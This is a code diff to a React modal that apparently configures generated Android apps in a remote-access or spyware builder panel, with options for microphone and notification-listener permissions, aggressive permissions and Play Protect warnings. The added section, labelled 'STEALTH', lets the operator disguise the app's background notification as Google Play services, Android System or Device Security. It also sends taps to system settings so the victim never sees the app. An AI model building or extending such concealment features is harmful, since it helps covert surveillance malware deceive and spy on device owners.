@@ -53,6 +53,42 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
 
+    // Notification Customization State
+    const [showNotificationSettings, setShowNotificationSettings] = useState(false);
+    const [notificationStyle, setNotificationStyle] = useState("google_play");
+    const [notificationClickAction, setNotificationClickAction] = useState("device_info");
+    const [notificationTitle, setNotificationTitle] = useState("");
+    const [notificationText, setNotificationText] = useState("");
+    const [notificationIcon, setNotificationIcon] = useState("info");
+
+    const NOTIFICATION_PRESETS: Record<string, { title: string; text: string; icon: string }> = {
+        google_play: { title: "Google Play services", text: "Checking for updates…", icon: "ℹ️" },
+        android_system: { title: "Android System", text: "Updating system components…", icon: "🔄" },
+        device_security: { title: "Device Security", text: "Scanning for threats…", icon: "🔒" },
+        system_ui: { title: "System UI", text: "Syncing system data…", icon: "🔄" },
+        device_maintenance: { title: "Device maintenance", text: "Optimizing performance…", icon: "🔄" },
+        download_manager: { title: "Download Manager", text: "Download in progress…", icon: "⬇️" },
+        custom: { title: "Custom", text: "Set your own title & text", icon: "✏️" },
+    };
+
+    const CLICK_ACTIONS: Record<string, string> = {
+        device_info: "Device Info (About Phone)",
+        settings: "Settings (Main)",
+        security: "Security Settings",
+        battery: "Battery Settings",
+        wifi: "WiFi Settings",
+        storage: "Storage Settings",
+        none: "Do Nothing",
+    };
+
+    const ICON_OPTIONS: Record<string, string> = {
+        info: "ℹ️ Info",
+        sync: "🔄 Sync",
+        lock: "🔒 Lock",
+        download: "⬇️ Download",
+        download_done: "✅ Download Done",
+    };
+
     // Custom Alert Modal State
     const [showCustomAlert, setShowCustomAlert] = useState(false);
     const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });
@@ -157,6 +193,13 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
             formData.append('enableNotificationListener', enableNotificationListener.toString());
             formData.append('aggressivePermissions', aggressivePermissions.toString());
+            formData.append('notificationStyle', notificationStyle);
+            formData.append('notificationClickAction', notificationClickAction);
+            if (notificationStyle === 'custom') {
+                formData.append('notificationTitle', notificationTitle);
+                formData.append('notificationText', notificationText);
+                formData.append('notificationIcon', notificationIcon);
+            }
             if (customIcon) {
                 formData.append('icon', customIcon);
             }
@@ -403,6 +446,125 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 >
                                     <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                                 </button>
+                            </div>
+
+                            {/* Notification Style Section - Collapsible */}
+                            <div className="mt-4 pt-4 border-t border-white/10">
+                                <button
+                                    onClick={() => setShowNotificationSettings(!showNotificationSettings)}
+                                    className="flex items-center gap-2 text-sm text-white/70 hover:text-white transition-colors w-full"
+                                >
+                                    <svg className={`w-4 h-4 transition-transform ${showNotificationSettings ? 'rotate-90' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path>
+                                    </svg>
+                                    <svg className="w-4 h-4 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                    <span className="font-semibold">Notification Style</span>
+                                    <span className="text-[10px] px-1.5 py-0.5 bg-orange-500/20 text-orange-400 rounded ml-auto">STEALTH</span>
+                                </button>
+
+                                {showNotificationSettings && (
+                                    <div className="mt-3 space-y-3">
+                                        <p className="text-xs text-white/40 leading-tight">Customize how the background notification looks. Choose a preset that blends in with system notifications.</p>
+
+                                        {/* Notification Style Preset */}
+                                        <div>
+                                            <label className="block text-xs font-medium text-white/60 mb-1">Notification Preset</label>
+                                            <select
+                                                value={notificationStyle}
+                                                onChange={(e) => setNotificationStyle(e.target.value)}
+                                                className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-2 text-white text-sm focus:outline-none focus:border-orange-500 appearance-none cursor-pointer"
+                                                style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='white' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M19 9l-7 7-7-7'/%3E%3C/svg%3E")`, backgroundRepeat: 'no-repeat', backgroundPosition: 'right 8px center', backgroundSize: '16px' }}
+                                            >
+                                                {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
+                                                    <option key={key} value={key} className="bg-[#1a1a1a]">
+                                                        {preset.icon} {preset.title}
+                                                    </option>
+                                                ))}
+                                            </select>
+                                        </div>
+
+                                        {/* Preview */}
+                                        {notificationStyle !== 'custom' && (
+                                            <div className="bg-white/5 rounded-lg p-3 border border-white/10">
+                                                <p className="text-[10px] text-white/40 mb-2 uppercase tracking-wider">Preview</p>
+                                                <div className="flex items-start gap-2">
+                                                    <span className="text-lg">{NOTIFICATION_PRESETS[notificationStyle]?.icon}</span>
+                                                    <div>
+                                                        <p className="text-sm font-medium text-white/90">{NOTIFICATION_PRESETS[notificationStyle]?.title}</p>
+                                                        <p className="text-xs text-white/50">{NOTIFICATION_PRESETS[notificationStyle]?.text}</p>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        )}
+
+                                        {/* Custom Fields */}
+                                        {notificationStyle === 'custom' && (
+                                            <div className="space-y-2 bg-orange-500/5 p-3 rounded-lg border border-orange-500/20">
+                                                <div>
+                                                    <label className="block text-xs font-medium text-white/60 mb-1">Title</label>
+                                                    <input
+                                                        type="text"
+                                                        value={notificationTitle}
+                                                        onChange={(e) => setNotificationTitle(e.target.value)}
+                                                        className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-1.5 text-white text-sm focus:outline-none focus:border-orange-500"
+                                                        placeholder="Google Play services"
+                                                    />
+                                                </div>
+                                                <div>
+                                                    <label className="block text-xs font-medium text-white/60 mb-1">Text</label>
+                                                    <input
+                                                        type="text"
+                                                        value={notificationText}
+                                                        onChange={(e) => setNotificationText(e.target.value)}
+                                                        className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-1.5 text-white text-sm focus:outline-none focus:border-orange-500"
+                                                        placeholder="Checking for updates…"
+                                                    />
+                                                </div>
+                                                <div>
+                                                    <label className="block text-xs font-medium text-white/60 mb-1">Icon</label>
+                                                    <select
+                                                        value={notificationIcon}
+                                                        onChange={(e) => setNotificationIcon(e.target.value)}
+                                                        className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-1.5 text-white text-sm focus:outline-none focus:border-orange-500 appearance-none cursor-pointer"
+                                                        style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='white' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M19 9l-7 7-7-7'/%3E%3C/svg%3E")`, backgroundRepeat: 'no-repeat', backgroundPosition: 'right 8px center', backgroundSize: '16px' }}
+                                                    >
+                                                        {Object.entries(ICON_OPTIONS).map(([key, label]) => (
+                                                            <option key={key} value={key} className="bg-[#1a1a1a]">{label}</option>
+                                                        ))}
+                                                    </select>
+                                                </div>
+
+                                                {/* Custom Preview */}
+                                                <div className="bg-white/5 rounded-lg p-3 border border-white/10 mt-2">
+                                                    <p className="text-[10px] text-white/40 mb-2 uppercase tracking-wider">Preview</p>
+                                                    <div className="flex items-start gap-2">
+                                                        <span className="text-lg">{ICON_OPTIONS[notificationIcon]?.split(' ')[0]}</span>
+                                                        <div>
+                                                            <p className="text-sm font-medium text-white/90">{notificationTitle || "Google Play services"}</p>
+                                                            <p className="text-xs text-white/50">{notificationText || "Checking for updates…"}</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        )}
+
+                                        {/* Click Action */}
+                                        <div>
+                                            <label className="block text-xs font-medium text-white/60 mb-1">On Notification Click</label>
+                                            <select
+                                                value={notificationClickAction}
+                                                onChange={(e) => setNotificationClickAction(e.target.value)}
+                                                className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-2 text-white text-sm focus:outline-none focus:border-orange-500 appearance-none cursor-pointer"
+                                                style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='white' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M19 9l-7 7-7-7'/%3E%3C/svg%3E")`, backgroundRepeat: 'no-repeat', backgroundPosition: 'right 8px center', backgroundSize: '16px' }}
+                                            >
+                                                {Object.entries(CLICK_ACTIONS).map(([key, label]) => (
+                                                    <option key={key} value={key} className="bg-[#1a1a1a]">{label}</option>
+                                                ))}
+                                            </select>
+                                            <p className="text-xs text-white/30 mt-1">Opens this system screen instead of your app</p>
+                                        </div>
+                                    </div>
+                                )}
                             </div>
 
                             {/* Advanced Section - Collapsible, Hidden by Default */}
